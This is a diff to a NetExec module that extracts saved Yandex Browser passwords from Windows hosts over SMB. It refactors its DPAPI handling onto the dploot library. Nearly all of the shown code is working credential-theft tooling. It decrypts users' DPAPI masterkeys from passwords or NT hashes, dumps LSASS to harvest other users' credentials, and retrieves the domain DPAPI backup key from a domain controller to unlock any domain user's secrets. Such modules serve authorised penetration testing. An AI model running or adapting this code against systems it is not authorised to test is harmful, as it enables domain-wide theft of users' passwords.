@@ -6,38 +6,27 @@
 # References:
 #   https://yandex.ru/support/browser/security/passwords.html
 #   https://github.com/akhomlyuk/Ya_Decrypt
-
-
+#
 import base64
 import hashlib
 import json
 import os
 import re
 import sqlite3
-import struct
 import time
 from binascii import hexlify, unhexlify
 
-from Crypto.Cipher import AES, PKCS1_v1_5
-from impacket import crypto as impacket_crypto
-from impacket.dcerpc.v5 import lsad, transport
-from impacket.dpapi import (
-    DPAPI_BLOB,
-    DPAPI_DOMAIN_RSA_MASTER_KEY,
-    DomainKey,
-    MasterKey,
-    MasterKeyFile,
-    PREFERRED_BACKUP_KEY,
-    PRIVATE_KEY_BLOB,
-    PVK_FILE_HDR,
-    deriveKeysFromUser,
-    deriveKeysFromUserkey,
-    privatekeyblob_to_pkcs1,
-)
-from impacket.smbconnection import SMBConnection
-from impacket.uuid import bin_to_string
+from Crypto.Cipher import AES
+
+from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
+from dploot.lib.masterkey import Masterkey as DplootMasterkey
+from dploot.lib.target import Target
+from dploot.lib.smb import DPLootSMBConnection
+from dploot.triage.backupkey import BackupkeyTriage
+from dploot.triage.masterkeys import MasterkeysTriage
 
 from nxc.helpers.misc import CATEGORY
+from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
 
 try:
     from lsassy.dumper import Dumper
@@ -51,13 +40,9 @@ except ImportError:
 
 LOCAL_STATE_PATH = r"Users\{user}\AppData\Local\Yandex\YandexBrowser\User Data\Local State"
 PASSMAN_PATH = r"Users\{user}\AppData\Local\Yandex\YandexBrowser\User Data\{profile}\Ya Passman Data"
-PROTECT_BASE = r"Users\{user}\AppData\Roaming\Microsoft\Protect"
 YANDEX_CHECK = r"Users\{user}\AppData\Local\Yandex\YandexBrowser"
 
-GUID_RE = re.compile(r"^[0-9a-fA-F-]{36}$")
 YANDEX_SIG = b"\x08\x01\x12\x20"
-
-
 class NXCModule:
     """
     Yandex Browser DPAPI credential extractor.
@@ -115,7 +100,28 @@ class NXCModule:
             self.target_users = [u.strip().lower() for u in module_options["USERS"].split(",") if u.strip()]
         if "VERBOSE" in module_options:
             self.verbose = module_options["VERBOSE"].lower() == "true"
+    def _make_target(self, connection, address_override=None):
+        """Build a dploot Target from an NXC connection object."""
+        return Target.create(
+            domain=connection.domain,
+            username=connection.username,
+            password=getattr(connection, "password", ""),
+            target=address_override or connection.host,
+            lmhash=getattr(connection, "lmhash", ""),
+            nthash=getattr(connection, "nthash", ""),
+            do_kerberos=getattr(connection, "kerberos", False),
+            aesKey=getattr(connection, "aesKey", None),
+            no_pass=True,
+            use_kcache=getattr(connection, "use_kcache", False),
+        )
 
+    @staticmethod
+    def _make_dploot_conn(connection, target):
+        """Wrap existing NXC SMB session into a DPLootSMBConnection."""
+        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
+        if conn is None:
+            raise RuntimeError("Could not upgrade SMB connection to dploot")
+        return conn
     def on_admin_login(self, context, connection):
         smb = connection.conn
         auth_user = connection.username.split("\\")[-1].lower()
@@ -134,7 +140,17 @@ class NXCModule:
 
         context.log.display("Extracting Yandex Browser credentials")
 
-        self._process_auth_user(smb, auth_user, password, nthash_hex, is_domain_user, context, connection, cleanup_files)
+        target = self._make_target(connection)
+        try:
+            dploot_conn = self._make_dploot_conn(connection, target)
+        except Exception as e:
+            context.log.fail(f"dploot connection failed: {e}")
+            return
+
+        self._process_auth_user(
+            smb, dploot_conn, target, auth_user, password,
+            nthash_hex, is_domain_user, context, connection, cleanup_files,
+        )
 
         if not (self.lsass_mode or self.backupkey_mode):
             self._cleanup(cleanup_files)
@@ -149,14 +165,13 @@ class NXCModule:
         context.log.display(f"Found Yandex Browser for users: {', '.join(other_users)}")
 
         if self.lsass_mode:
-            self._lsass_attack(other_users, context, connection, cleanup_files)
+            self._lsass_attack(other_users, dploot_conn, target, context, connection, cleanup_files)
 
         if self.backupkey_mode:
-            self._backupkey_attack(smb, other_users, context, connection, cleanup_files)
+            self._backupkey_attack(smb, other_users, dploot_conn, target, context, connection, cleanup_files)
 
         self._cleanup(cleanup_files)
         context.log.success("Yandex Browser dump completed")
-
     def _enumerate_yandex_users(self, smb, skip_user, context):
         """List usernames that have Yandex Browser data, excluding skip_user."""
         users = []
@@ -180,14 +195,37 @@ class NXCModule:
         except Exception as e:
             context.log.debug(f"User enumeration error: {e}")
         return users
-
-    def _process_auth_user(self, smb, user, password, nthash_hex, is_domain_user, context, connection, cleanup_files):
+    @staticmethod
+    def _triage_masterkeys_for_user(dploot_conn, target, user, passwords=None, nthashes=None, pvkbytes=None, context=None):
+        """Use dploot MasterkeysTriage to collect and decrypt masterkeys for a single user."""
+        try:
+            mk_triage = MasterkeysTriage(
+                target=target,
+                conn=dploot_conn,
+                pvkbytes=pvkbytes,
+                passwords=passwords or {},
+                nthashes=nthashes or {},
+            )
+            masterkeys = mk_triage.triage_masterkeys_for_user(user)
+            if context:
+                context.log.debug(f"[{user}] dploot decrypted {len(masterkeys)} masterkey(s)")
+            return masterkeys
+        except Exception as e:
+            if context:
+                context.log.debug(f"[{user}] dploot masterkey triage error: {e}")
+            return []
+    @staticmethod
+    def _unprotect_encrypted_key(blob, masterkeys):
+        """Decrypt DPAPI blob using dploot find_masterkey_for_blob + decrypt_blob."""
+        try:
+            mk = find_masterkey_for_blob(blob, masterkeys)
+            if mk is None:
+                return None
+            return decrypt_blob(blob, mk)
+        except Exception:
+            return None
+    def _process_auth_user(self, smb, dploot_conn, target, user, password, nthash_hex, is_domain_user, context, connection, cleanup_files):
         """Decrypt the authenticated user's browser data."""
-        sid = self._get_user_sid(smb, user)
-        if not sid:
-            context.log.fail(f"[{user}] Could not determine SID")
-            return
-
         ls_local = f"Local_State_{user}.json"
         remote = LOCAL_STATE_PATH.format(user=user)
         try:
@@ -209,22 +247,18 @@ class NXCModule:
             return
         cleanup_files.append(passman_db)
 
-        masterkeys = []
-
+        passwords = {}
+        nthashes = {}
         if password:
-            masterkeys = self._collect_masterkeys(smb, user, sid, password)
-            if masterkeys:
-                context.log.debug(f"[{user}] Masterkeys decrypted via plaintext password")
+            passwords[user.lower()] = password
+        if nthash_hex and is_domain_user:
+            nthashes[user.lower()] = nthash_hex
 
-        if not masterkeys and nthash_hex:
-            if is_domain_user:
-                context.log.debug(f"[{user}] No password, trying NT-hash (domain account)")
-                nt_bytes = unhexlify(nthash_hex)
-                masterkeys = self._collect_masterkeys_with_hash(smb, user, sid, nt_bytes, context)
-                if masterkeys:
-                    context.log.debug(f"[{user}] Masterkeys decrypted via NT-hash")
-            else:
-                context.log.debug(f"[{user}] Local account + NT-hash only, cannot decrypt (SHA1 prekey needed)")
+        masterkeys = self._triage_masterkeys_for_user(
+            dploot_conn, target, user,
+            passwords=passwords, nthashes=nthashes,
+            context=context,
+        )
 
         if not masterkeys:
             if not password and nthash_hex and not is_domain_user:
@@ -277,11 +311,8 @@ class NXCModule:
         cleanup_files.append(passman_db)
 
         self._do_browser_decrypt(encrypted_blob, masterkeys, passman_db, user, context, connection)
-
-    # LSASS
-
-    def _lsass_attack(self, users, context, connection, cleanup_files):
-        """Dump LSASS via lsassy to get credentials for users with active sessions."""
+    def _lsass_attack(self, users, dploot_conn, target, context, connection, cleanup_files):
+        """Dump LSASS via lsassy, then use extracted creds to decrypt masterkeys via dploot."""
         if not HAS_LSASSY:
             context.log.fail("[LSASS] lsassy is not installed (pip install lsassy)")
             return
@@ -325,7 +356,7 @@ class NXCModule:
             context.log.fail("[LSASS] Unable to parse lsass dump")
             return
 
-        credentials, tickets, masterkeys = parsed
+        credentials, tickets, masterkeys_from_lsass = parsed
         dump_file.close()
 
         try:
@@ -355,8 +386,8 @@ class NXCModule:
                 entry["sha1"] = c["sha1"]
 
         lsass_dpapi_keys = {}
-        if masterkeys:
-            for mk_cred in masterkeys:
+        if masterkeys_from_lsass:
+            for mk_cred in masterkeys_from_lsass:
                 try:
                     obj = mk_cred if isinstance(mk_cred, dict) else mk_cred.get_object()
                     guid = (obj.get("guid") or obj.get("masterkey") or "").lower().strip("{}")
@@ -382,50 +413,42 @@ class NXCModule:
                 continue
 
             context.log.display(f"[LSASS] Processing {user}")
-            sid = self._get_user_sid(smb, user)
-            if not sid:
-                continue
-
             entry = cred_map[ulow]
-            dec_masterkeys = self._try_lsass_masterkey_chain(smb, user, sid, entry, lsass_dpapi_keys, context)
+
+            passwords = {}
+            nthashes = {}
+            if entry.get("password"):
+                passwords[ulow] = entry["password"]
+            if entry.get("nthash"):
+                nthashes[ulow] = entry["nthash"]
+
+            dec_masterkeys = self._triage_masterkeys_for_user(
+                dploot_conn, target, user,
+                passwords=passwords, nthashes=nthashes,
+                context=context,
+            )
+
+            if not dec_masterkeys and entry.get("sha1"):
+                context.log.debug(f"[LSASS][{user}] Retrying with SHA1 prekey")
+                dec_masterkeys = self._triage_masterkeys_for_user(
+                    dploot_conn, target, user,
+                    nthashes={ulow: entry["sha1"]},
+                    context=context,
+                )
+
+            if not dec_masterkeys and lsass_dpapi_keys:
+                context.log.debug(f"[LSASS][{user}] Using {len(lsass_dpapi_keys)} raw key(s) from LSASS DPAPI cache")
+                dec_masterkeys = [
+                    DplootMasterkey(guid=guid, key=key_bytes)
+                    for guid, key_bytes in lsass_dpapi_keys.items()
+                ]
 
             if not dec_masterkeys:
                 context.log.fail(f"[LSASS][{user}] No masterkeys decrypted")
                 continue
 
-            context.log.success(f"[LSASS][{user}] Decrypted {len(dec_masterkeys)} masterkey(s)")
+            context.log.success(f"[LSASS][{user}] Got {len(dec_masterkeys)} masterkey(s)")
             self._process_other_user_with_masterkeys(smb, user, dec_masterkeys, context, connection, cleanup_files)
-
-    def _try_lsass_masterkey_chain(self, smb, user, sid, entry, lsass_dpapi_keys, context):
-        """Try decrypting masterkeys via fallback chain: password -> NT-hash -> SHA1 -> DPAPI cache."""
-        if entry.get("password"):
-            context.log.debug(f"[LSASS][{user}] Trying plaintext password")
-            keys = self._collect_masterkeys(smb, user, sid, entry["password"])
-            if keys:
-                context.log.success(f"[LSASS][{user}] Decrypted via plaintext password ({len(keys)} key(s))")
-                return keys
-
-        if entry.get("nthash"):
-            context.log.debug(f"[LSASS][{user}] Trying NT-hash")
-            nt_bytes = unhexlify(entry["nthash"])
-            keys = self._collect_masterkeys_with_hash(smb, user, sid, nt_bytes, context)
-            if keys:
-                context.log.success(f"[LSASS][{user}] Decrypted via NT-hash ({len(keys)} key(s))")
-                return keys
-
-        if entry.get("sha1"):
-            context.log.debug(f"[LSASS][{user}] Trying SHA1 hash")
-            sha1_bytes = unhexlify(entry["sha1"])
-            keys = self._collect_masterkeys_with_hash(smb, user, sid, sha1_bytes, context)
-            if keys:
-                context.log.success(f"[LSASS][{user}] Decrypted via SHA1 prekey ({len(keys)} key(s))")
-                return keys
-
-        if lsass_dpapi_keys:
-            context.log.debug(f"[LSASS][{user}] Trying {len(lsass_dpapi_keys)} key(s) from LSASS DPAPI cache")
-            return list(lsass_dpapi_keys.values())
-
-        return []
 
     def _print_lsass_verbose(self, cred_map, lsass_dpapi_keys, context):
         """Print detailed LSASS credential table when VERBOSE=true."""
@@ -443,279 +466,66 @@ class NXCModule:
                 context.log.display(f"[LSASS]     Password: {u_data['password']}")
         if lsass_dpapi_keys:
             context.log.display(f"[LSASS]   DPAPI cache: {len(lsass_dpapi_keys)} masterkey(s)")
-
-    # BACKUPKEY
-
-    def _backupkey_attack(self, smb, users, context, connection, cleanup_files):
+    def _backupkey_attack(self, smb, users, dploot_conn, target, context, connection, cleanup_files):
         """Use DPAPI Domain Backup Key to decrypt any domain user's masterkeys."""
-        pvk_data = None
+        pvkbytes = None
 
         if self.pvkfile:
             try:
                 with open(self.pvkfile, "rb") as f:
-                    pvk_data = f.read()
+                    pvkbytes = f.read()
                 context.log.success(f"[BACKUPKEY] Loaded PVK from {self.pvkfile}")
             except Exception as e:
                 context.log.fail(f"[BACKUPKEY] Cannot read PVK file: {e}")
                 return
         elif self.dc_ip:
-            pvk_data = self._extract_backup_key_from_dc(context, connection)
-            if not pvk_data:
+            pvkbytes = self._extract_backup_key_from_dc(context, connection)
+            if not pvkbytes:
                 return
         else:
             context.log.fail("[BACKUPKEY] Specify DC=<ip> or PVKFILE=<path>")
             return
 
-        try:
-            key_blob = PRIVATE_KEY_BLOB(pvk_data[len(PVK_FILE_HDR()):])
-            rsa_key = privatekeyblob_to_pkcs1(key_blob)
-            rsa_cipher = PKCS1_v1_5.new(rsa_key)
-        except Exception as e:
-            context.log.fail(f"[BACKUPKEY] Failed to parse PVK: {e}")
-            return
-
         for user in users:
             context.log.display(f"[BACKUPKEY] Processing {user}")
-            mk = self._collect_masterkeys_with_backupkey(smb, user, rsa_cipher, context)
-            if not mk:
+            masterkeys = self._triage_masterkeys_for_user(
+                dploot_conn, target, user,
+                pvkbytes=pvkbytes,
+                context=context,
+            )
+            if not masterkeys:
                 context.log.fail(f"[BACKUPKEY][{user}] No masterkeys decrypted")
                 continue
-            context.log.success(f"[BACKUPKEY][{user}] Decrypted {len(mk)} masterkey(s)")
-            self._process_other_user_with_masterkeys(smb, user, mk, context, connection, cleanup_files)
+            context.log.success(f"[BACKUPKEY][{user}] Decrypted {len(masterkeys)} masterkey(s)")
+            self._process_other_user_with_masterkeys(smb, user, masterkeys, context, connection, cleanup_files)
 
     def _extract_backup_key_from_dc(self, context, connection):
-        """Extract DPAPI Domain Backup Key from DC via MS-LSAD."""
+        """Extract DPAPI Domain Backup Key from DC via dploot BackupkeyTriage."""
         context.log.display(f"[BACKUPKEY] Extracting backup key from DC {self.dc_ip}")
         try:
-            dc_conn = SMBConnection(self.dc_ip, self.dc_ip)
-            username = connection.username
-            password = getattr(connection, "password", "")
-            domain = connection.domain
-            lmhash = getattr(connection, "lmhash", "")
-            nthash = getattr(connection, "nthash", "")
-            dc_conn.login(username, password, domain, lmhash=lmhash, nthash=nthash)
+            dc_target = Target.create(
+                domain=connection.domain,
+                username=connection.username,
+                password=getattr(connection, "password", ""),
+                target=self.dc_ip,
+                lmhash=getattr(connection, "lmhash", ""),
+                nthash=getattr(connection, "nthash", ""),
+                do_kerberos=getattr(connection, "kerberos", False),
+                aesKey=getattr(connection, "aesKey", None),
+                no_pass=True,
+            )
+            dc_conn = DPLootSMBConnection(dc_target)
+            dc_conn.connect()
 
-            rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\lsarpc]")
-            rpctransport.set_smb_connection(dc_conn)
-            dce = rpctransport.get_dce_rpc()
-            dce.connect()
-            dce.bind(lsad.MSRPC_UUID_LSAD)
+            backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
+            backupkey = backupkey_triage.triage_backupkey()
+            pvkbytes = backupkey.backupkey_v2
 
-            resp = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
-
-            for keyname in ("G$BCKUPKEY_PREFERRED", "G$BCKUPKEY_P"):
-                buffer = impacket_crypto.decryptSecret(
-                    dc_conn.getSessionKey(),
-                    lsad.hLsarRetrievePrivateData(dce, resp["PolicyHandle"], keyname),
-                )
-                name = f"G$BCKUPKEY_{bin_to_string(buffer)}"
-                secret = impacket_crypto.decryptSecret(
-                    dc_conn.getSessionKey(),
-                    lsad.hLsarRetrievePrivateData(dce, resp["PolicyHandle"], name),
-                )
-                key_version = struct.unpack("<L", secret[:4])[0]
-                if key_version == 2:
-                    backup_key = PREFERRED_BACKUP_KEY(secret)
-                    pvk = backup_key["Data"][:backup_key["KeyLength"]]
-                    header = PVK_FILE_HDR()
-                    header["dwMagic"] = 0xB0B5F11E
-                    header["dwVersion"] = 0
-                    header["dwKeySpec"] = 1
-                    header["dwEncryptType"] = 0
-                    header["cbEncryptData"] = 0
-                    header["cbPvk"] = backup_key["KeyLength"]
-                    pvk_data = header.getData() + pvk
-                    context.log.success("[BACKUPKEY] Domain backup key extracted")
-                    dce.disconnect()
-                    dc_conn.close()
-                    return pvk_data
-
-            dce.disconnect()
-            dc_conn.close()
+            context.log.success("[BACKUPKEY] Domain backup key extracted")
+            return pvkbytes
         except Exception as e:
             context.log.fail(f"[BACKUPKEY] Failed to extract backup key: {e}")
         return None
-
-    # DPAPI masterkey
-
-    def _get_user_sid(self, smb, user):
-        """Find SID directory under user's DPAPI Protect folder."""
-        base = PROTECT_BASE.format(user=user)
-        try:
-            for e in smb.listPath("C$", base + "\\*"):
-                if e.get_longname().startswith("S-1-5-21-"):
-                    return e.get_longname()
-        except Exception:
-            return None
-
-    def _collect_masterkeys(self, smb, user, sid, password):
-        """Decrypt masterkeys using plaintext password (deriveKeysFromUser)."""
-        keys = []
-        base = f"{PROTECT_BASE.format(user=user)}\\{sid}"
-        try:
-            for e in smb.listPath("C$", base + "\\*"):
-                if GUID_RE.match(e.get_longname()):
-                    buf = bytearray()
-                    smb.getFile("C$", f"{base}\\{e.get_longname()}", buf.extend)
-                    mk = self._decrypt_masterkey(bytes(buf), sid, password)
-                    if mk:
-                        keys.append(mk)
-        except Exception:
-            pass
-        return keys
-
-    def _decrypt_masterkey(self, data, sid, password):
-        """Decrypt a single masterkey file using plaintext password."""
-        try:
-            mkf = MasterKeyFile(data)
-            offset = len(mkf)
-            mk = MasterKey(data[offset:offset + mkf["MasterKeyLen"]])
-            for key in deriveKeysFromUser(sid, password):
-                try:
-                    dec = mk.decrypt(key)
-                    if dec:
-                        return dec
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        return None
-
-    def _collect_masterkeys_with_hash(self, smb, user, sid, key_bytes, context=None):
-        """Decrypt masterkeys using a hash (NT-hash or SHA1 via deriveKeysFromUserkey)."""
-        keys = []
-        base = f"{PROTECT_BASE.format(user=user)}\\{sid}"
-        guid_count = 0
-        try:
-            for e in smb.listPath("C$", base + "\\*"):
-                name = e.get_longname()
-                if GUID_RE.match(name):
-                    guid_count += 1
-                    if context:
-                        context.log.debug(f"[MK] {user}: trying masterkey {name}")
-                    buf = bytearray()
-                    smb.getFile("C$", f"{base}\\{name}", buf.extend)
-                    mk = self._decrypt_masterkey_with_hash(bytes(buf), sid, key_bytes, context, name)
-                    if mk:
-                        keys.append(mk)
-        except Exception as e:
-            if context:
-                context.log.debug(f"[MK] {user}: listPath/getFile error: {e}")
-        if context:
-            context.log.debug(f"[MK] {user}: found {guid_count} GUID files, decrypted {len(keys)}")
-        return keys
-
-    def _decrypt_masterkey_with_hash(self, data, sid, key_bytes, context=None, mk_name=""):
-        """Decrypt a single masterkey file using a hash.
-
-        Tries both MasterKey and BackupKey sections: on modern Windows
-        the MasterKey section is often SHA1-derived while BackupKey may use MD4/NT-hash.
-        """
-        try:
-            mkf = MasterKeyFile(data)
-            remaining = data[len(mkf):]
-            derived_keys = deriveKeysFromUserkey(sid, key_bytes)
-
-            if mkf["MasterKeyLen"] > 0:
-                mk = MasterKey(remaining[:mkf["MasterKeyLen"]])
-                if context:
-                    context.log.debug(
-                        f"[MK] {mk_name}: MKLen={mkf['MasterKeyLen']} BKLen={mkf['BackupKeyLen']} "
-                        f"DKLen={mkf['DomainKeyLen']} CHLen={mkf['CredHistLen']}"
-                    )
-                for i, key in enumerate(derived_keys):
-                    try:
-                        dec = mk.decrypt(key)
-                        if dec:
-                            if context:
-                                context.log.debug(f"[MK] {mk_name}: MasterKey decrypted with key #{i}")
-                            return dec
-                    except Exception as e:
-                        if context:
-                            context.log.debug(f"[MK] {mk_name}: MasterKey key #{i} error: {e}")
-
-            bk_offset = mkf["MasterKeyLen"]
-            if mkf["BackupKeyLen"] > 0:
-                bkmk = MasterKey(remaining[bk_offset:bk_offset + mkf["BackupKeyLen"]])
-                if context:
-                    context.log.debug(f"[MK] {mk_name}: trying BackupKey section")
-                for i, key in enumerate(derived_keys):
-                    try:
-                        dec = bkmk.decrypt(key)
-                        if dec:
-                            if context:
-                                context.log.debug(f"[MK] {mk_name}: BackupKey decrypted with key #{i}")
-                            return dec
-                    except Exception as e:
-                        if context:
-                            context.log.debug(f"[MK] {mk_name}: BackupKey key #{i} error: {e}")
-
-            if context:
-                context.log.debug(f"[MK] {mk_name}: neither MasterKey nor BackupKey decrypted")
-        except Exception as e:
-            if context:
-                context.log.debug(f"[MK] {mk_name}: parse error: {e}")
-        return None
-
-    def _collect_masterkeys_with_backupkey(self, smb, user, rsa_cipher, context):
-        """Decrypt masterkeys using Domain Backup Key (RSA on DomainKey section)."""
-        keys = []
-        sid = self._get_user_sid(smb, user)
-        if not sid:
-            return keys
-        base = f"{PROTECT_BASE.format(user=user)}\\{sid}"
-        try:
-            for e in smb.listPath("C$", base + "\\*"):
-                if GUID_RE.match(e.get_longname()):
-                    buf = bytearray()
-                    smb.getFile("C$", f"{base}\\{e.get_longname()}", buf.extend)
-                    mk = self._decrypt_masterkey_with_backupkey(bytes(buf), rsa_cipher)
-                    if mk:
-                        keys.append(mk)
-        except Exception:
-            pass
-        return keys
-
-    def _decrypt_masterkey_with_backupkey(self, data, rsa_cipher):
-        """Decrypt a masterkey file using domain backup RSA key on its DomainKey."""
-        try:
-            mkf = MasterKeyFile(data)
-            remaining = data[len(mkf):]
-
-            if mkf["MasterKeyLen"] > 0:
-                remaining = remaining[mkf["MasterKeyLen"]:]
-            if mkf["BackupKeyLen"] > 0:
-                remaining = remaining[mkf["BackupKeyLen"]:]
-            if mkf["CredHistLen"] > 0:
-                remaining = remaining[mkf["CredHistLen"]:]
-
-            if mkf["DomainKeyLen"] > 0:
-                dk = DomainKey(remaining[:mkf["DomainKeyLen"]])
-                decrypted = rsa_cipher.decrypt(dk["SecretData"][::-1], None)
-                if decrypted:
-                    domain_mk = DPAPI_DOMAIN_RSA_MASTER_KEY(decrypted)
-                    return domain_mk["buffer"][:domain_mk["cbMasterKey"]]
-        except Exception:
-            pass
-        return None
-
-    # Browser crypto
-
-    def _unprotect_encrypted_key(self, blob, masterkeys):
-        """Decrypt DPAPI blob using one of the masterkeys."""
-        try:
-            dpapi = DPAPI_BLOB(blob)
-            for key in masterkeys:
-                try:
-                    dec = dpapi.decrypt(key)
-                    if dec:
-                        return dec
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        return None
-
     @staticmethod
     def _aes_gcm_decrypt(data, key, aad=None):
         """Decrypt AES-256-GCM with optional AAD."""
